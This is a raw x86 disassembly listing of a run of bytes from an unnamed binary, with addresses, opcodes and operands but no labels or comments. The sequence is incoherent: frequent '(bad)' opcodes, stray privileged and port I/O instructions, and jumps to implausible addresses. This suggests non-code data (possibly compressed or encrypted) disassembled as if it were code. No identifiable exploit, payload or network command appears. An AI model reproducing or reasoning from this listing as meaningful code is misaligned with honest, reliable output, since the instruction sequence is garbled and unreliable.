  4922b3:	add    DWORD PTR [eax+0x10],esi
  4922b6:	div    DWORD PTR [eax]
  4922b8:	das    
  4922b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4922ba:	add    eax,0x55bf8433
  4922bf:	retf   0x875a
  4922c2:	pop    edi
  4922c3:	push   edi
  4922c4:	pop    eax
  4922c5:	push   ebp
  4922c6:	inc    ecx
  4922c7:	popa   
  4922c8:	das    
  4922c9:	xor    DWORD PTR [ecx-0x1f],0x48cfbbdb
  4922d0:	shl    DWORD PTR [edx-0x70f810de],0x21
  4922d7:	pusha  
  4922d8:	(bad)  
  4922d9:	jmp    DWORD PTR [edi+0x36]
  4922dc:	ds inc eax
  4922de:	dec    eax
  4922df:	and    edi,ebp
  4922e1:	inc    esp
  4922e2:	push   ecx
  4922e3:	mov    eax,ds:0x3a2f0241
  4922e8:	and    al,0x6d
  4922ea:	mov    ecx,DWORD PTR [edi-0x51]
  4922ed:	xchg   edi,eax
  4922ee:	test   BYTE PTR [esi-0x49],dl
  4922f1:	mov    al,0x2f
  4922f3:	stos   BYTE PTR es:[edi],al
  4922f4:	test   eax,0x379f13a1
  4922f9:	mov    bh,0x21
  4922fb:	push   edi
  4922fc:	mov    al,ds:0x42379691
  492301:	lods   eax,DWORD PTR ds:[esi]
  492302:	push   ecx
  492303:	dec    eax
  492304:	pop    es
  492305:	pop    edi
  492306:	imul   edx,DWORD PTR [ebp+0x62],0xe13733b9
  49230d:	xchg   esp,eax
  49230e:	sbb    BYTE PTR [eax],cl
  492310:	outs   dx,DWORD PTR ds:[esi]
  492311:	data16 add BYTE PTR [esi-0x7f],dl
  492315:	sbb    DWORD PTR [edi],0x34
  492318:	xchg   DWORD PTR [ebp-0x10ea7f0a],esi
  49231e:	aas    
  49231f:	pop    ss
  492320:	push   esi
  492321:	and    eax,0xa737ab11
  492326:	xor    ebx,esi
  492328:	data16 jmp 0x4922ad
  49232b:	(bad)  
  49232d:	pop    edi
  49232e:	and    edx,DWORD PTR [ecx+0x1b]
  492331:	outs   dx,DWORD PTR ds:[esi]
  492332:	addr16 lahf 
  492334:	add    eax,0x1f6ab05a
  492339:	dec    edi
  49233a:	movhlps xmm0,xmm6
  49233d:	call   0xe2541aa5
  492342:	mov    BYTE PTR [eax+0x75],ah
  492345:	pop    edi
  492346:	xor    BYTE PTR [bx+si-0x7d],ch
  49234a:	ins    DWORD PTR es:[edi],dx
  49234b:	push   ebp
  49234c:	seta   BYTE PTR [edx+0x6046c097]
  492353:	rol    DWORD PTR [edi],0x27
  492356:	bound  esi,QWORD PTR [ebx+edi*2+0x62275feb]
  49235d:	daa    
  49235e:	mov    eax,ds:0x6d83a2d
  492363:	daa    
  492364:	cmp    BYTE PTR [edi],cl
  492366:	daa    
  492367:	push   0x31e48c27
  49236c:	add    BYTE PTR [ebx],dh
  49236e:	out    dx,al
  49236f:	daa    
  492370:	jo     0x4923e2
  492372:	adc    al,BYTE PTR [eax-0x9]
  492375:	xor    ebx,DWORD PTR [ecx]
  492377:	mov    ds:0xbfaf8b00,eax
  49237c:	sbb    al,0x68
  49237e:	imul   esp,DWORD PTR [ebx+0x7639a6d7],0x8ac08936
  492388:	mov    ch,0x6f
  49238a:	and    edi,ecx
  49238c:	adc    eax,0x35878bac
  492391:	aaa    
  492392:	stos   BYTE PTR es:[edi],al
  492393:	mov    al,ds:0xffef6935
  492398:	and    BYTE PTR [eax],cl
  49239a:	sub    ebp,DWORD PTR [esi+eiz*1+0x456e6c28]
  4923a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4923a2:	pop    edi
  4923a3:	daa    
  4923a4:	cs loope 0x492385
  4923a7:	mov    bh,bh
  4923a9:	inc    ebx
  4923aa:	jle    0x49236b
  4923ac:	test   cl,dl
  4923ae:	add    al,0xa4
  4923b0:	and    DWORD PTR [bx+di-0x2728],esi
  4923b5:	fbstp  TBYTE PTR [edi-0x7dea9ee9]
  4923bb:	pop    eax
  4923bc:	push   edi
  4923bd:	adc    DWORD PTR [ecx],0xffffffd2
  4923c0:	and    dh,BYTE PTR [edi-0x2d]
  4923c3:	cs push esi
  4923c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4923c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4923c7:	xor    al,0x67
  4923c9:	xlat   BYTE PTR ds:[ebx]
  4923ca:	add    edx,0xb607a6e0
  4923d0:	dec    edx
  4923d1:	push   ebx
  4923d2:	or     DWORD PTR [edi],0xfffffff7
  4923d5:	dec    edi
  4923d6:	inc    edx
  4923d7:	les    esp,FWORD PTR [eax+esi*4+0x5842466f]
  4923de:	loopne 0x492437
  4923e0:	dec    edi
  4923e1:	xadd   DWORD PTR [ecx],esp
  4923e4:	push   esi
  4923e5:	lods   eax,DWORD PTR ds:[esi]
  4923e6:	pop    ds
  4923e7:	iret   
  4923e8:	aas    
  4923e9:	mov    BYTE PTR es:[eax+0x58],bh
  4923ed:	push   ebx
  4923ee:	lahf   
  4923ef:	mov    ch,0xa
  4923f1:	dec    ebp
  4923f2:	sub    eax,0xb128b177
  4923f7:	mov    ch,BYTE PTR [edi+0x12055c1f]
  4923fd:	loope  0x4923b2
  4923ff:	push   DWORD PTR [eax]
  492401:	inc    ebp
  492402:	sbb    ch,BYTE PTR [eax]
  492404:	sub    DWORD PTR [edi+0x306c7737],ebx
  49240a:	(bad)  
  49240b:	pop    eax
  49240c:	push   edx
  49240d:	pop    eax
  49240f:	inc    edx
  492410:	pop    es
  492411:	dec    ebp
  492412:	pop    es
  492413:	iret   
  492414:	inc    edx
  492415:	xchg   DWORD PTR [eax-0x40c6c935],ecx
  49241b:	adc    dl,dl
  49241d:	push   eax
  49241e:	or     esp,edi
  492420:	push   edi
  492421:	inc    edx
  492422:	dec    eax
  492423:	dec    esp
  492424:	cmp    BYTE PTR [esi],0x5b
  492427:	aas    
  492428:	xchg   esi,eax
  492429:	jno    0x49243f
  49242b:	shl    BYTE PTR [edi+0x43],cl
  49242e:	and    DWORD PTR [esi+0xf87ad4a],eax
  492434:	aaa    
  492435:	pop    ss
  492436:	push   ss
  492437:	push   ss
  492438:	add    eax,0x3ba6c752
  49243d:	outs   dx,BYTE PTR ds:[esi]
  49243e:	lea    edi,[edi+0x2a]
  492441:	imul   esi,DWORD PTR [esi],0x4f
  492444:	xor    al,0x10
  492446:	imul   eax,DWORD PTR [ebx],0x27
  492449:	into   
  49244a:	xor    ecx,edx
  49244c:	pop    edx
  49244d:	adc    DWORD PTR [esi+0x45604fd7],0x76b7d7a1
  492457:	data16 test BYTE PTR [edx+0x5b],ch
  49245b:	aaa    
  49245c:	inc    edi
  49245d:	and    DWORD PTR [ebx+0x5b],esp
  492460:	scas   al,BYTE PTR es:[edi]
  492461:	inc    esi
  492462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492463:	les    ebp,FWORD PTR [eax+0x3257aaba]
  492469:	fild   QWORD PTR [eax+0x2d]
  49246c:	es sub al,0xdf
  49246f:	outs   dx,DWORD PTR ds:[esi]
  492470:	jne    0x4924bd
  492472:	or     ecx,DWORD PTR [edx]
  492474:	daa    
  492475:	ja     0x492421
  492477:	lds    ebp,FWORD PTR [edx+eiz*2+0x2f]
  49247b:	lahf   
  49247c:	imul   eax,DWORD PTR [ebp-0xa],0x6
  492480:	xor    bl,cl
  492482:	sub    esi,DWORD PTR [edi+0x21]
  492485:	and    DWORD PTR [ebp+0x2d],eax
  492488:	lahf   
  492489:	imul   esp,DWORD PTR [ecx+0x5],0x50c773f1
  492490:	add    dh,al
  492492:	or     dh,bh
  492494:	daa    
  492495:	or     eax,DWORD PTR [esi-0x3d]
  492498:	pop    eax
  492499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49249a:	mov    ds:0x5f59f5a0,al
  49249f:	xor    esp,DWORD PTR [edi]
  4924a1:	test   BYTE PTR [ebp+0x13],dl
  4924a4:	adc    al,0x57
  4924a6:	adc    edx,eax
  4924a8:	bound  esi,QWORD PTR [edi+edi*2+0x556a556b]
  4924af:	pop    ds
  4924b0:	outs   dx,DWORD PTR ds:[esi]
  4924b1:	push   ebp
  4924b2:	xchg   ebx,eax
  4924b3:	(bad)  
  4924b4:	imul   esi,edi,0xc48d62ef
  4924ba:	mov    bh,bh
  4924bc:	inc    edi
  4924bd:	xchg   ecx,eax
  4924be:	inc    eax
  4924bf:	sub    ch,BYTE PTR [eax+0x1f]
  4924c2:	imul   eax,DWORD PTR [ecx+0x1fd7506b],0xffffffb7
  4924c9:	popf   
  4924ca:	xor    BYTE PTR [eax-0x74305cbd],0xe
  4924d1:	or     BYTE PTR [eax],cl
  4924d3:	dec    DWORD PTR [edx-0x68ed73a0]
  4924d9:	out    dx,eax
  4924da:	mov    al,ds:0x5736c08d
  4924df:	pop    edi
  4924e0:	arpl   WORD PTR [ebx],ax
  4924e2:	inc    edx
  4924e3:	aaa    
  4924e4:	(bad)  
  4924e5:	out    dx,eax
  4924e6:	push   ebp
  4924e7:	sar    BYTE PTR [eax+0x4f6ffac0],cl
  4924ed:	pusha  
  4924ee:	and    eax,0x77363057
  4924f3:	inc    ebx
  4924f4:	push   eax
  4924f5:	rcr    DWORD PTR [edx],cl
  4924f7:	ins    DWORD PTR es:[edi],dx
  4924f8:	das    
  4924f9:	xlat   BYTE PTR ds:[ebx]
  4924fa:	sub    al,0x30
  4924fc:	mov    al,0xae
  4924fe:	das    
  4924ff:	out    0x27,eax
  492501:	push   esi
  492502:	add    DWORD PTR [ecx],eax
  492504:	div    esi
  492506:	and    cl,ch
  492508:	mov    dh,0x85
  49250a:	jle    0x492541
  49250c:	inc    eax
  49250d:	ja     0x492537
  49250f:	push   ebp
  492510:	and    ebp,DWORD PTR [edi+0xb316a35]
  492516:	mov    eax,ds:0xa111d7c7
  49251b:	cwde   
  49251c:	ret    0x5f0a
  49251f:	jno    0x4924b9
  492521:	ret    0xb775
  492524:	xor    al,0xaf
  492526:	sub    DWORD PTR [ebp+0x5],ebp
  492529:	dec    edx
  49252a:	das    
  49252b:	scas   eax,DWORD PTR es:[edi]
  49252c:	add    al,BYTE PTR [esi+0x37]
  49252f:	push   ss
  492530:	aas    
  492531:	mov    edi,0xba113626
  492536:	pop    ss
  492537:	jmp    FWORD PTR [edx+0x4]
  49253a:	inc    esi
  49253b:	popf   
  49253c:	aaa    
  49253d:	daa    
  49253e:	mov    al,0x40
  492540:	pop    edx
  492541:	(bad)  
  492542:	aaa    
  492543:	outs   dx,DWORD PTR ds:[esi]
  492544:	push   ebx
  492545:	ins    BYTE PTR es:[edi],dx
  492546:	pop    esp
  492547:	sub    bh,BYTE PTR [edi]
  492549:	dec    esi
  49254a:	iret   
  49254b:	cmp    ebp,edx
  49254d:	inc    esp
  49254e:	pop    esp
  49254f:	add    eax,0x5a573507
  492554:	mov    ch,0x26
  492556:	sub    BYTE PTR [edi],bl
  492558:	movhps QWORD PTR [ebx],xmm4
  49255b:	jne    0x4924dd
  49255d:	dec    DWORD PTR [edi]
  49255f:	aaa    
  492560:	test   al,dl
  492562:	dec    esp
  492563:	or     dh,BYTE PTR [edi-0x43e42ab]
  492569:	pop    ds
  49256a:	xor    edi,DWORD PTR [ebx+0x2a]
  49256d:	cmp    esi,DWORD PTR [edi]
  49256f:	pusha  
  492570:	push   0xc4ff8407
  492575:	pop    es
  492576:	cmc    
  492577:	push   esi
  492578:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492579:	xchg   edi,eax
  49257a:	adc    ebx,DWORD PTR ds:0x97d38352
  492580:	pop    es
  492581:	xchg   esi,eax
  492582:	push   cs
  492583:	mov    ch,0xa5
  492585:	daa    
  492586:	(bad)  
  492587:	dec    edi
  492588:	stos   DWORD PTR es:[edi],eax
  492589:	mov    DWORD PTR [eax+0x1d],ebx
  49258c:	mov    bh,0x87
  49258e:	mov    ecx,edx
  492590:	test   BYTE PTR [esi-0x1],ch
  492593:	inc    esp
  492594:	inc    edi
  492595:	push   0x1751316a
  49259a:	add    bl,ch
  49259c:	imul   eax,DWORD PTR [ebp-0x61],0x63
  4925a0:	ins    BYTE PTR es:[edi],dx
  4925a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4925a2:	sbb    dl,bl
  4925a4:	add    edi,DWORD PTR [edi-0x5f]
  4925a7:	jne    0x4925bc
  4925a9:	cmp    ecx,edi
  4925ab:	aaa    
  4925ac:	push   0x678756b3
  4925b1:	xchg   edi,eax
  4925b2:	sbb    eax,0x7f245622
  4925b7:	ja     0x492614
  4925b9:	pop    esp
  4925ba:	nop
  4925bb:	push   ss
  4925bc:	ja     0x4925dd
  4925be:	fcmovnb st,st(5)
  4925c0:	lods   al,BYTE PTR ds:[esi]
  4925c1:	push   eax
  4925c2:	aas    
  4925c3:	xor    eax,0x7902437
  4925c8:	dec    ecx
  4925c9:	push   esi
  4925ca:	cmp    BYTE PTR [ebx],ch
  4925cc:	ret    0x89a
  4925cf:	(bad)  
  4925d0:	mov    edi,0x740444bc
  4925d5:	(bad)  
  4925d7:	xchg   DWORD PTR [edi],edi
  4925d9:	mov    dl,0x94
  4925db:	or     BYTE PTR [eax+0x47],al
  4925de:	add    DWORD PTR [ecx-0x6898d4eb],0xffffffa7
  4925e5:	mov    dl,BYTE PTR [ecx+eax*8-0x3c]
  4925e9:	(bad)  [edi+0x6c]
  4925ec:	and    eax,0x449ec4cd
  4925f1:	aas    
  4925f2:	mov    ah,0xe3
  4925f4:	add    ch,BYTE PTR [ebx+0xf]
  4925f7:	inc    ebp
  4925f8:	or     BYTE PTR [di],bl
  4925fb:	ss (bad) 
  4925fd:	dec    edi
  4925fe:	xchg   edi,eax
  4925ff:	sub    dl,BYTE PTR [ecx]
  492601:	add    DWORD PTR [eax],0x5f
  492604:	daa    
  492605:	dec    edi
  492606:	add    DWORD PTR [eax+0x23],0xffffffef
  49260a:	fist   WORD PTR [edx]
  49260c:	mov    ch,0x46
  49260e:	adc    bh,BYTE PTR [edi+0x1d]
  492611:	push   eax
  492612:	fs push 0xf4df3167
  492618:	clc    
  492619:	and    dl,BYTE PTR [esi-0x69]
  49261c:	xchg   ebx,eax
  49261d:	aaa    
  49261e:	aam    0x9
  492620:	lods   al,BYTE PTR ds:[esi]
  492621:	call   0x41f33dcd
  492626:	call   0x14489554
  49262b:	pop    eax
  49262c:	adc    DWORD PTR [eax],0x9d24237
  492632:	stos   DWORD PTR es:[edi],eax
  492633:	mul    DWORD PTR [esi+0x0]
  492636:	jecxz  0x492639
  492638:	mov    esp,DWORD PTR [edi+0x1f]
  49263b:	or     BYTE PTR [ecx+0x3527280b],ah
  492641:	iret   
  492642:	push   edi
  492643:	test   DWORD PTR [ebp-0x7c],ebp
  492646:	aas    
  492647:	ss xor eax,0xd75354b0
  49264d:	das    
  49264e:	inc    ebp
  49264f:	add    eax,0x1f826062
  492654:	inc    ecx
  492655:	adc    eax,0x2f1ab180
  49265a:	dec    edi
  49265b:	and    dl,BYTE PTR [edx+edx*1+0x58]
  49265f:	xlat   BYTE PTR ds:[ebx]
  492660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492661:	sub    ebp,eax
  492663:	mov    BYTE PTR [esi],0x97
  492666:	das    
  492667:	jmp    0x49266b
  492669:	mov    cl,0xe
  49266b:	dec    edi
  49266c:	lahf   
  49266d:	xor    esp,DWORD PTR [eax+0x3f1f0031]
  492673:	lea    esi,[eax]
  492675:	es in  al,0x37
  492678:	cmp    BYTE PTR [edi+0x4d],bl
  49267b:	jecxz  0x4926eb
  49267d:	sub    ecx,DWORD PTR [edi-0x7ed91dba]
  492683:	aam    0x27
  492685:	inc    edi
  492686:	(bad)  
  492688:	sub    ch,al
  49268a:	xor    dh,BYTE PTR [edi]
  49268c:	out    dx,eax
  49268d:	(bad)  
  49268e:	leave  
  49268f:	add    BYTE PTR [edi+0x27],al
  492692:	cmp    BYTE PTR ds:0x4f24c158,dl
  492698:	lahf   
  492699:	mov    al,BYTE PTR [eax]
  49269b:	lods   eax,DWORD PTR ds:[esi]
  49269c:	xchg   BYTE PTR [edi],ch
  49269e:	mov    ecx,0x1f11c108
  4926a4:	(bad)  
  4926a5:	xor    eax,0xef878b49
  4926aa:	cmp    DWORD PTR [edi],esp
  4926ac:	sub    BYTE PTR [esi+0x72],dl
  4926af:	add    eax,0x314c1738
  4926b4:	fstp   DWORD PTR [edx]
  4926b6:	inc    ebx
  4926b7:	(bad)  
  4926b8:	xor    al,0xc4
  4926ba:	sbb    DWORD PTR [eax],edi
  4926bc:	dec    ecx
  4926bd:	addr16 xor al,0x6
  4926c0:	jno    0x49266e
  4926c2:	dec    ecx
  4926c3:	inc    edi
  4926c4:	pop    ds
  4926c5:	mov    eax,ds:0x87960d60
  4926ca:	pop    es
  4926cb:	inc    ebp
  4926cc:	(bad)  
  4926cd:	fs pusha 
  4926cf:	dec    edi
  4926d0:	cmp    BYTE PTR [edi+0x6d],dh
  4926d3:	aad    0x6d
  4926d5:	bound  ebp,QWORD PTR [edi]
  4926d7:	das    
  4926d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4926d9:	push   ebp
  4926da:	add    eax,0x7c98fa0
  4926df:	push   edx
  4926e0:	xchg   DWORD PTR [edi-0x5a],ebx
  4926e3:	xor    al,0x5b
  4926e5:	adc    BYTE PTR [edx+0xa],dl
  4926e8:	out    0x27,eax
  4926ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4926eb:	es es push 0x7
  4926ef:	xor    DWORD PTR [esi+0x5],edx
  4926f2:	inc    ebx
  4926f3:	add    al,0xb7
  4926f5:	aaa    
  4926f6:	pop    es
  4926f7:	mov    ds:0x6e17c852,al
  4926fc:	xor    edx,DWORD PTR [ebp+0x6c]
  4926ff:	(bad)  
  492700:	int    0x97
  492702:	inc    ecx
  492704:	mov    ds:0x877f84b4,al
  492709:	shr    BYTE PTR [edx+0x502f6801],cl
  49270f:	inc    esi
  492710:	mov    bl,bl
  492712:	iret   
  492713:	add    DWORD PTR [esi],eax
  492715:	jmp    0x8f7ed6ba
  49271a:	nop
  49271b:	mov    al,ds:0xe7308c04
  492720:	xchg   ebp,eax
  492721:	pop    edx
  492722:	xor    esi,edx
  492724:	addr16 daa 
  492726:	pop    ds
  492727:	xchg   ecx,eax
  492728:	and    BYTE PTR [esi-0x6beed87c],al
  49272e:	(bad)  
  49272f:	sub    BYTE PTR [edi-0x47f13a01],dl
  492735:	lea    edx,[edi+0x43]
  492738:	push   DWORD PTR [eax-0x705ffb56]
  49273e:	nop
  49273f:	cmc    
  492740:	push   esi
  492741:	cmp    esp,DWORD PTR fs:[edi]
  492744:	sti    
  492745:	in     al,0x6
  492747:	pop    edx
  492748:	imul   ebx,DWORD PTR [edi],0x57
  49274b:	inc    ebx
  49274c:	mov    al,ds:0x6f253634
  492751:	jmp    FWORD PTR [ecx+ecx*1+0x2b]
  492755:	cdq    
  492756:	xor    DWORD PTR [ecx],edx
  492758:	lods   al,BYTE PTR ds:[esi]
  492759:	sub    edx,esp
  49275b:	fistp  QWORD PTR [edi]
  49275d:	fistp  WORD PTR [ebx+edx*1-0x5f]
  492761:	jno    0x492797
  492763:	pop    es
  492764:	xor    al,0x7
  492766:	lods   al,BYTE PTR ds:[esi]
  492767:	cmp    BYTE PTR [ebp+0x46b10701],ch
  49276d:	xlat   BYTE PTR ds:[ebx]
  49276e:	add    dh,bh
  492770:	neg    DWORD PTR [edi]
  492772:	xchg   edi,eax
  492773:	cmp    BYTE PTR [ecx+0x5d],ch
  492776:	xor    eax,0xab42876f
  49277b:	mov    al,ds:0x46ad7789
  492780:	popa   
  492781:	adc    eax,0x45c9df37
  492786:	test   BYTE PTR [eax+0x2039efe7],dh
  49278c:	mov    WORD PTR [eax],ds
  49278e:	dec    eax
  49278f:	call   DWORD PTR [esi+0x37a7561a]
  492795:	addr16 iret 
  492797:	imul   esp,edx,0x42ffb504
  49279d:	jmp    0xefb9c84c
  4927a2:	fild   WORD PTR [edx+0x4c]
  4927a5:	mov    al,ds:0x338f6a26
  4927aa:	jp     0xbf9129e5
  4927b0:	pop    ss
  4927b1:	push   es
  4927b2:	adc    BYTE PTR [ecx-0x50],0x87
  4927b6:	outs   dx,DWORD PTR ds:[esi]
  4927b7:	xor    edx,DWORD PTR [esi+0x2]
  4927ba:	ret    0xc342
  4927bd:	add    eax,0xf724c3ab
  4927c2:	aas    
  4927c3:	adc    DWORD PTR [edx+0x2d],ebx
  4927c6:	popa   
  4927c7:	push   edi
  4927c8:	sbb    edx,DWORD PTR [eax+0x8]
  4927cb:	cdq    
  4927cc:	scas   eax,DWORD PTR es:[edi]
  4927cd:	xor    DWORD PTR [ebp+0x44],ebp
  4927d0:	bound  ebp,QWORD PTR [ebx+0x504f0757]
  4927d6:	test   BYTE PTR [edx],ah
  4927d8:	jmp    0x4927f1
  4927da:	ja     0x49283b
  4927dc:	mov    esp,0x3833d116
  4927e1:	cmp    DWORD PTR [edi-0x72],esi
  4927e4:	mov    ebx,DWORD PTR [edx+0x1a]
  4927e7:	push   ebp
  4927e8:	xchg   DWORD PTR [edi],edx
  4927ea:	pusha  
  4927eb:	and    edx,DWORD PTR [esi+0x45]
  4927ee:	lahf   
  4927ef:	push   edi
  4927f0:	xchg   BYTE PTR ds:0x4177449d,ah
  4927f6:	pop    ss
  4927f7:	adc    al,0x58
  4927f9:	int3   
  4927fa:	ret    0x7af
  4927fd:	fsub   st,st(0)
  4927ff:	adc    al,0x46
  492801:	pandn  mm7,QWORD PTR [ecx-0x80]
  492805:	adc    ebx,DWORD PTR [edx+0x382f45]
  49280b:	xor    bl,BYTE PTR [edx+0x21]
  49280e:	add    al,0x2c
  492810:	jg     0x492818
  492812:	imul   esp,DWORD PTR [eax+0xf31ff18],0xffffffaf
  492819:	xor    eax,0xfe678901
  49281e:	xchg   esi,eax
  49281f:	mov    al,0x2e
  492821:	push   edx
  492822:	aas    
  492823:	dec    ebx
  492824:	push   ecx
  492825:	dec    ecx
  492826:	iret   
  492827:	cmovg  edx,DWORD PTR [ebx-0x54e3ea95]
  49282e:	ss mov edi,0xcaa8311f
  492834:	adc    eax,0x1f4541af
  492839:	cwde   
  49283a:	mov    BYTE PTR [edx+esi*1],al
  49283d:	ss das 
  49283f:	push   0xab30f02b
  492844:	das    
  492845:	aaa    
  492846:	imul   esi,DWORD PTR [edx+ecx*8],0xffffffc0
  49284a:	aaa    
  49284b:	adc    BYTE PTR [eax+0x43],ch
  49284e:	sbb    eax,0x255fde27
  492853:	add    al,0x5c
  492855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492856:	dec    edi
  492857:	aaa    
  492858:	out    0x92,eax
  49285a:	xor    DWORD PTR [ebp+0x4557704],0xa7c7eb11
  492864:	mov    ch,ch
  492866:	adc    cl,BYTE PTR [ecx-0x5bba2009]
  49286c:	jcxz   0x4928a6
  49286f:	mov    bh,0x8f
  492871:	inc    eax
  492872:	imul   esi,DWORD PTR [ebx+ebp*1],0x27
  492876:	sub    al,0xd6
  492878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492879:	lds    esi,FWORD PTR [edi-0x79]
  49287c:	sub    cl,BYTE PTR [ebp+0x47449310]
  492882:	ret    
  492883:	add    eax,0x330fa830
  492888:	cs push eax
  49288a:	sbb    eax,0x53178a2d
  49288f:	outs   dx,DWORD PTR ds:[esi]
  492890:	sbb    DWORD PTR [ebx+0x18],0x72
  492894:	inc    ebp
  492895:	das    
  492896:	or     eax,0x39a838a4
  49289b:	xchg   edi,eax
  49289c:	and    BYTE PTR [ebx-0x3f],dl
  49289f:	or     cl,BYTE PTR [edi]
  4928a1:	pop    ss
  4928a2:	ss add eax,esi
  4928a5:	ins    BYTE PTR es:[edi],dx
  4928a6:	arpl   WORD PTR [ebx],sp
  4928a8:	dec    edi
  4928a9:	ret    
  4928aa:	pop    eax
  4928ab:	test   DWORD PTR [eax],ebx
  4928ad:	xlat   BYTE PTR ds:[ebx]
  4928ae:	mov    dl,0xb0
  4928b0:	lods   eax,DWORD PTR ds:[esi]
  4928b1:	push   0xffffffcf
  4928b3:	aaa    
  4928b4:	test   BYTE PTR [esi],al
  4928b6:	pusha  
  4928b7:	fnsave [edi-0x727dd719]
  4928bd:	xor    al,0x37
  4928bf:	iret   
  4928c0:	adc    eax,0x87c26b0b
  4928c5:	ja     0x4928ef
  4928c7:	push   esp
  4928c8:	inc    ecx
  4928c9:	retf   
  4928ca:	aaa    
  4928cb:	mov    edi,0x68560b4d
  4928d0:	pop    ss
  4928d1:	pop    es
  4928d2:	(bad)  
  4928d3:	outs   dx,BYTE PTR ds:[esi]
  4928d4:	xor    al,0x1a
  4928d6:	pop    eax
  4928d7:	iret   
  4928d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4928d9:	je     0x492887
  4928db:	dec    edx
  4928dc:	cmp    BYTE PTR [edi],0x17
  4928df:	mov    dl,ah
  4928e1:	pop    eax
  4928e2:	sbb    edi,DWORD PTR [edi]
  4928e4:	out    dx,eax
  4928e5:	lahf   
  4928e6:	dec    ebp
  4928e7:	lods   al,BYTE PTR ds:[esi]
  4928e8:	inc    eax
  4928e9:	ret    0xdb2f
  4928ec:	fcom   DWORD PTR [eax+0x6e87e7a8]
  4928f2:	daa    
  4928f3:	xchg   esp,eax
  4928f4:	dec    esi
  4928f5:	das    
  4928f6:	jae    0x5865bda5
  4928fc:	mov    esi,0xa0bad246
  492901:	inc    ecx
  492902:	inc    DWORD PTR [edi+0x46]
  492905:	adc    ecx,DWORD PTR [esp+ebp*4-0x3d]
  492909:	(bad)  
  49290a:	mov    ds:0xcfcbac50,eax
  49290f:	(bad)  
  492910:	pop    ds
  492911:	(bad)
  492915:	test   al,0x67
  492917:	pop    eax
  492918:	test   DWORD PTR [eax-0x56],edx
  49291b:	aaa    
  49291c:	addr16 loopne 0x49297b
  49291f:	jno    0x492956
  492921:	ja     0x49295a
  492923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492924:	inc    esp
  492925:	mov    DWORD PTR ds:0x8fbe7ad2,edx
  49292b:	adc    al,0x34
  49292d:	inc    esi
  49292e:	xchg   ecx,eax
  49292f:	xchg   edi,eax
  492930:	dec    edi
  492931:	and    esi,DWORD PTR [eax+0x11]
  492934:	pop    esp
  492935:	inc    ecx
  492936:	jg     0x492970
  492938:	addr16 fwait
  49293a:	gs ins DWORD PTR es:[edi],dx
  49293c:	pop    edx
  49293d:	movntq QWORD PTR [esp+ecx*1+0xa],mm2
  492942:	or     edi,edi
  492944:	pop    DWORD PTR [eax+ebx*4+0x4e832e74]
  49294b:	out    dx,eax
  49294c:	or     dl,dl
  49294e:	or     cl,BYTE PTR [eax+0x3f]
  492951:	mov    ah,0x98
  492953:	sub    DWORD PTR [edi+esi*2+0x62d65a7f],ecx
  49295a:	sub    BYTE PTR [edi-0x739bc540],0xd3
  492961:	outs   dx,DWORD PTR ds:[esi]
  492962:	dec    ebx
  492963:	xchg   BYTE PTR [esi+0x3847ff9a],dh
  492969:	inc    esi
  49296a:	rcr    DWORD PTR [edx+0x2f9734b6],0xf7
  492971:	xor    al,0xd5
  492973:	loopne 0x492929
  492975:	(bad)  
  492976:	daa    
  492977:	lods   eax,DWORD PTR ss:[esi]
  492979:	add    DWORD PTR [edx+edi*1+0x47],0x6f
  49297e:	cdq    
  49297f:	in     al,0xa
  492981:	and    DWORD PTR [edi+0x10753834],eax
  492987:	inc    esp
  492988:	add    dh,BYTE PTR [edi+0xc]
  49298b:	pop    edx
  49298c:	xor    esp,DWORD PTR [ecx-0x77ba40c1]
  492992:	or     BYTE PTR [esi],dl
  492994:	div    edi
  492996:	mov    al,ds:0x4f5a8855
  49299b:	dec    eax
  49299c:	mov    ebx,0x8f678742
  4929a1:	ret    0xad06
  4929a4:	inc    edx
  4929a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4929a6:	xchg   ebx,eax
  4929a7:	bound  eax,QWORD PTR [eax]
  4929a9:	mov    al,0x19
  4929ab:	aas    
  4929ac:	(bad)  
  4929ad:	gs popa 
  4929af:	xchg   ecx,eax
  4929b0:	adc    al,0xaf
  4929b2:	mov    ebx,0xdfa8351e
  4929b7:	pop    es
  4929b8:	scas   eax,DWORD PTR es:[edi]
  4929b9:	mov    al,ds:0xff4ba475
  4929be:	pop    ss
  4929bf:	adc    edi,DWORD PTR [eax+0x48]
  4929c2:	xor    ebp,DWORD PTR [edi]
  4929c4:	lahf   
  4929c5:	arpl   WORD PTR [ebp-0x3050ab80],ax
  4929cb:	sbb    eax,0x474051bd
  4929d0:	mov    ds:0x5585010f,eax
  4929d5:	imul   eax,edi,0x16108867
  4929db:	outs   dx,BYTE PTR ds:[esi]
  4929dc:	push   esi
  4929dd:	ja     0x4929f3
  4929df:	or     ah,BYTE PTR [eax]
  4929e1:	pop    ebp
  4929e2:	(bad)  
  4929e3:	xlat   BYTE PTR ds:[ebx]
  4929e4:	add    ecx,DWORD PTR [ecx]
  4929e6:	jns    0x492a18
  4929e8:	cmp    DWORD PTR cs:[eax+0x5],esp
  4929ec:	mov    eax,ds:0xc407e755
  4929f1:	fimul  DWORD PTR [edx]
  4929f3:	sub    DWORD PTR [edi-0x1],esi
  4929f6:	loope  0x49297a
  4929f8:	push   ebp
  4929f9:	rol    edi,0x9f
  4929fc:	xor    al,0x52
  4929fe:	fimul  DWORD PTR [eax]
  492a00:	lea    esi,[edi-0x5bf8edd9]
  492a06:	cmp    edi,0x32
  492a09:	pop    edi
  492a0a:	add    edx,DWORD PTR [esi-0x20]
  492a0d:	or     al,0x7
  492a0f:	(bad)  
  492a10:	mov    edi,0xf0d0356f
